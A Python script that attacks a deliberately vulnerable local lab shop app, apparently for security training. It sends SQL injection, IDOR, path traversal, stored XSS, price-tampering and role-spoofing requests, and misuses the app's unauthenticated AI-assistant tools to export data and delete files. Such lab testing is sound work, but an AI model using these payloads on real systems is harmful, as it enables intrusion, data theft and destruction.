"""Black-box attacks against the deliberately vulnerable Mini Shop.

The script talks only to http://127.0.0.1:8066 and stores raw evidence.
All identities and data are synthetic.
"""

import json
import sys
from urllib.error import HTTPError
from urllib.parse import quote
from urllib.request import Request, urlopen

BASE = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8066"


def call(method, path, body=None, headers=None):
    headers = {"Content-Type": "application/json", **(headers or {})}
    data = json.dumps(body).encode() if body is not None else None
    request = Request(BASE + path, data=data, headers=headers, method=method)
    try:
        response = urlopen(request, timeout=5)
    except HTTPError as exc:
        response = exc
    with response:
        raw = response.read().decode("utf-8", "replace")
    try:
        parsed = json.loads(raw)
    except json.JSONDecodeError:
        parsed = raw
    return response.status, parsed


def show(title, status, payload):
    print(f"\n=== {title} ===")
    print(f"HTTP {status}")
    print(json.dumps(payload, ensure_ascii=False, indent=2)[:4000])


def login(username, password):
    status, payload = call("POST", "/login", {"username": username, "password": password})
    assert status == 200, (status, payload)
    return payload["token"]


print(f"Target: {BASE}")

alice = login("alice", "learn-alice")
bob = login("bob", "learn-bob")
staff = login("staff", "learn-staff")
print(f"Tokens obtained: alice={alice[:8]}..., bob={bob[:8]}..., staff={staff[:8]}...")

# --- 1. Unauthenticated profile access / IDOR -------------------------------
status, payload = call("GET", "/profile?id=2")
show("IDOR: anonymous read of bob's profile via /profile?id=2", status, payload)

# --- 2. SQL injection in /profile -------------------------------------------
injection = quote("0 UNION SELECT 999,'INJECTED','injected@example.invalid','INJECTED_ADDRESS'--")
status, payload = call("GET", f"/profile?id={injection}")
show("SQLi: UNION SELECT in /profile?id=", status, payload)

status, payload = call("GET", "/profile?id=" + quote("1 OR 1=1"))
show("SQLi: boolean OR 1=1 in /profile?id=", status, payload)

# --- 3. SQL injection in /search --------------------------------------------
status, payload = call("GET", "/search?q=" + quote("' OR 1=1--"))
show("SQLi: /search?q=' OR 1=1--", status, payload)

# --- 4. Orders are global and unauthenticated -------------------------------
status, payload = call("GET", "/orders")
show("IDOR: anonymous GET /orders returns every order", status, payload)

# --- 5. Price tampering ------------------------------------------------------
status, payload = call("POST", "/orders", {"product": "chair", "price": 1}, {"X-Token": alice})
show("Business logic: alice buys chair for client-supplied price=1", status, payload)

status, payload = call("POST", "/orders", {"product": "lamp", "price": -100}, {"X-Token": bob})
show("Business logic: bob buys lamp for negative price=-100", status, payload)

# --- 6. Role spoofing on /admin/export --------------------------------------
status, payload = call("GET", "/admin/export", headers={"X-Role": "staff"})
show("AuthZ: anonymous export with only X-Role: staff", status, payload)

status, payload = call("GET", "/admin/export", headers={"X-Token": alice, "X-Role": "staff"})
show("AuthZ: alice (customer) exports profiles with X-Role: staff", status, payload)

status, payload = call("GET", "/admin/export", headers={"X-Token": staff})
show("AuthZ control: staff token without X-Role is rejected", status, payload)

# --- 7. File access: other users and traversal ------------------------------
status, payload = call("GET", "/files?user=bob&path=receipt.txt", headers={"X-Token": alice})
show("IDOR: alice reads bob's receipt", status, payload)

status, payload = call("GET", "/files?user=" + quote("..") + "&path=private/operator-note.txt")
show("Path traversal: anonymous reads private/operator-note.txt", status, payload)

# --- 8. Assistant tools have no authorization -------------------------------
status, payload = call("POST", "/assistant/execute", {
    "decision": {"tool": "export_profiles", "arguments": {}}
})
show("AuthZ: anonymous assistant export_profiles", status, payload)

status, payload = call("POST", "/assistant/execute", {
    "decision": {"tool": "read_file", "arguments": {"path": "private/operator-note.txt"}}
}, {"X-Token": alice})
show("AuthZ: alice's assistant reads operator note", status, payload)

# --- 9. SQL injection in assistant context ----------------------------------
status, payload = call("GET", "/assistant/context?order_id=" + quote("1 OR 1=1"))
show("SQLi/IDOR: assistant context with order_id=1 OR 1=1", status, payload)

status, payload = call("GET", "/assistant/context?order_id=" + quote(
    "0 UNION SELECT 777,2,'INJECTED_PRODUCT',1--"))
show("SQLi: UNION SELECT in assistant context", status, payload)

# --- 10. Stored XSS in reviews ----------------------------------------------
xss = "<script>alert('pwned')</script>"
status, payload = call("POST", "/reviews", {"product": "chair", "text": xss})
show("Stored XSS: anonymous review with script tag", status, payload)

status, payload = call("GET", "/reviews/view")
show("Stored XSS: /reviews/view returns unescaped HTML", status, payload)

# --- 11. Logs leak credentials and tokens -----------------------------------
status, payload = call("GET", "/debug/logs")
show("Info leak: anonymous /debug/logs with bodies and headers", status, payload)

# --- 12. Error details leak internals ---------------------------------------
status, payload = call("POST", "/orders", {}, {"X-Token": alice})
show("Error leak: POST /orders without product", status, payload)

status, payload = call("GET", "/profile?id=abc")
show("Error leak: /profile?id=abc", status, payload)

status, payload = call("GET", "/files?user=..&path=../../etc/passwd")
show("Error leak: /files traversal outside sandbox", status, payload)

# --- 13. Destructive assistant tool (last, service must be restarted) --------
status, payload = call("POST", "/assistant/execute", {
    "decision": {"tool": "delete_tree", "arguments": {"path": "."}}
})
show("Destructive: anonymous assistant delete_tree('.')", status, payload)

status, payload = call("GET", "/files?user=alice&path=receipt.txt")
show("After delete_tree: alice's receipt is gone", status, payload)
